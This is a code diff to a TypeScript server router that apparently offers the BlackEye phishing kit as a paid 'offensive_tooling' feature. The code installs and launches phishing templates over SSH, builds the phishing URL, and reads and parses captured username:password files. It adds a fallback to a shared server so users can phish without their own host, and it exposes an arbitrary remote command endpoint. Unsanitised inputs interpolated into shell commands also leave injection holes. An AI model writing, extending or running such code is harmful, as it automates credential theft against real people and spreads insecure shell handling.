@@ -19,6 +19,7 @@ import { eq, and } from "drizzle-orm";
 import { Client as SSHClient } from "ssh2";
 import { encrypt, decrypt } from "./fetcher-db";
 import { consumeCredits } from "./credit-service";
+import { getTitanServerConfig, execSSHCommand as execTitanSSH } from "./titan-server";
 import { logAdminAction } from "./admin-activity-log";
 
 // ─── Available BlackEye Templates ────────────────────────────────
@@ -78,8 +79,12 @@ interface SSHConfig {
 async function execSSHCommand(
   ssh: SSHConfig,
   command: string,
-  timeoutMs = 15000
+  timeoutMs = 20000,
+  userId?: number
 ): Promise<string> {
+  if ((ssh as any).isTitanServer && userId) {
+    return execTitanSSH(ssh as any, command, timeoutMs, userId);
+  }
   return new Promise((resolve, reject) => {
     const conn = new SSHClient();
     let output = "";
@@ -135,7 +140,13 @@ async function getSshConfig(userId: number) {
     .from(userSecrets)
     .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__blackeye_ssh")))
     .limit(1);
+  
   if (result.length === 0) {
+    // Fallback to shared Titan Server if configured
+    const titanConfig = getTitanServerConfig();
+    if (titanConfig) {
+      return titanConfig;
+    }
     throw new TRPCError({
       code: "BAD_REQUEST",
       message: "No BlackEye server configured. Please set up your SSH connection first.",
@@ -172,7 +183,7 @@ export const blackeyeRouter = router({
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
       try {
-        const result = await execSSHCommand(input, "echo 'BlackEye connection OK' && ls /opt/blackeye 2>/dev/null || echo 'BlackEye not installed'", 8000);
+        const result = await execSSHCommand(input, "echo 'BlackEye connection OK' && ls /opt/blackeye 2>/dev/null || echo 'BlackEye not installed'", 8000, ctx.user.id);
         const installed = result.includes("blackeye.sh") || result.includes("sites");
         return {
           success: true,
@@ -264,7 +275,7 @@ export const blackeyeRouter = router({
       "chmod +x /opt/blackeye/blackeye.sh",
       "echo 'BlackEye installed successfully at /opt/blackeye'",
     ].join(" && ");
-    const output = await execSSHCommand(sshConfig, installScript, 60000);
+    const output = await execSSHCommand(sshConfig, installScript, 60000, ctx.user.id);
     return { success: true, output };
   }),
 
@@ -276,10 +287,8 @@ export const blackeyeRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
     const sshConfig = await getSshConfig(ctx.user.id);
     const output = await execSSHCommand(
-      sshConfig,
-      "ls /opt/blackeye/sites 2>/dev/null | wc -l; git -C /opt/blackeye log --oneline -1 2>/dev/null; ps aux | grep -c '[b]lackeye' || echo 0",
-      10000
-    );
+      sshConfig, "ls /opt/blackeye/sites 2>/dev/null | wc -l; git -C /opt/blackeye log --oneline -1 2>/dev/null; ps aux | grep -c '[b]lackeye' || echo 0", 10000
+    , ctx.user.id);
     const lines = output.split("\n").filter(Boolean);
     const templateCount = parseInt(lines[0] || "0");
     const lastCommit = lines[1] || "unknown";
@@ -309,7 +318,7 @@ export const blackeyeRouter = router({
       const sshConfig = await getSshConfig(ctx.user.id);
       // Kill any existing BlackEye instance on the port first
       const killCmd = `fuser -k ${input.port}/tcp 2>/dev/null; sleep 1`;
-      await execSSHCommand(sshConfig, killCmd, 5000).catch(() => {});
+      await execSSHCommand(sshConfig, killCmd, 5000, ctx.user.id).catch(() => {});
       // Launch BlackEye with the selected template
       // The EricksonAtHome fork uses numbered menu options
       const templateMap: Record<string, number> = {
@@ -325,10 +334,10 @@ export const blackeyeRouter = router({
       const templateNum = templateMap[input.template] || 1;
       // Run BlackEye in background with the template number piped in
       const launchCmd = `cd /opt/blackeye && nohup bash -c "echo '${templateNum}' | bash blackeye.sh" > /tmp/blackeye_${input.port}.log 2>&1 &`;
-      await execSSHCommand(sshConfig, launchCmd, 10000);
+      await execSSHCommand(sshConfig, launchCmd, 10000, ctx.user.id);
       await new Promise(r => setTimeout(r, 2000));
       // Get the server's public IP for the phishing URL
-      const ipOutput = await execSSHCommand(sshConfig, "curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}'", 5000);
+      const ipOutput = await execSSHCommand(sshConfig, "curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}'", 5000, ctx.user.id);
       const serverIp = ipOutput.trim().split("\n")[0] || sshConfig.host;
       const phishingUrl = input.customDomain
         ? `http://${input.customDomain}`
@@ -351,10 +360,8 @@ export const blackeyeRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
     const sshConfig = await getSshConfig(ctx.user.id);
     const output = await execSSHCommand(
-      sshConfig,
-      "pkill -f blackeye.sh 2>/dev/null; fuser -k 80/tcp 2>/dev/null; fuser -k 8080/tcp 2>/dev/null; echo 'Stopped'",
-      10000
-    );
+      sshConfig, "pkill -f blackeye.sh 2>/dev/null; fuser -k 80/tcp 2>/dev/null; fuser -k 8080/tcp 2>/dev/null; echo 'Stopped'", 10000
+    , ctx.user.id);
     return { success: true, output };
   }),
 
@@ -369,10 +376,8 @@ export const blackeyeRouter = router({
       const sshConfig = await getSshConfig(ctx.user.id);
       const logPath = input.logFile || "/opt/blackeye/sites/*/usernames.txt";
       const output = await execSSHCommand(
-        sshConfig,
-        `cat ${logPath} 2>/dev/null || echo 'No captures yet'`,
-        10000
-      );
+        sshConfig, `cat ${logPath} 2>/dev/null || echo 'No captures yet'`, 10000
+      , ctx.user.id);
       // Parse captures: each line is typically "username:password" or "email:password"
       const captures = output
         .split("\n")
@@ -399,10 +404,8 @@ export const blackeyeRouter = router({
       enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
       const sshConfig = await getSshConfig(ctx.user.id);
       const output = await execSSHCommand(
-        sshConfig,
-        `tail -${input.lines} /tmp/blackeye_80.log 2>/dev/null || echo 'No active session log found'`,
-        10000
-      );
+        sshConfig, `tail -${input.lines} /tmp/blackeye_80.log 2>/dev/null || echo 'No active session log found'`, 10000
+      , ctx.user.id);
       return { output };
     }),
 
@@ -414,10 +417,8 @@ export const blackeyeRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
     const sshConfig = await getSshConfig(ctx.user.id);
     const output = await execSSHCommand(
-      sshConfig,
-      "cd /opt/blackeye && git pull origin master 2>&1 && echo 'Updated successfully'",
-      30000
-    );
+      sshConfig, "cd /opt/blackeye && git pull origin master 2>&1 && echo 'Updated successfully'", 30000
+    , ctx.user.id);
     return { success: true, output };
   }),
 
@@ -430,7 +431,7 @@ export const blackeyeRouter = router({
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
       const sshConfig = await getSshConfig(ctx.user.id);
-      const output = await execSSHCommand(sshConfig, input.command, 15000);
+      const output = await execSSHCommand(sshConfig, input.command, 15000, ctx.user.id);
       return { output };
     }),
 });
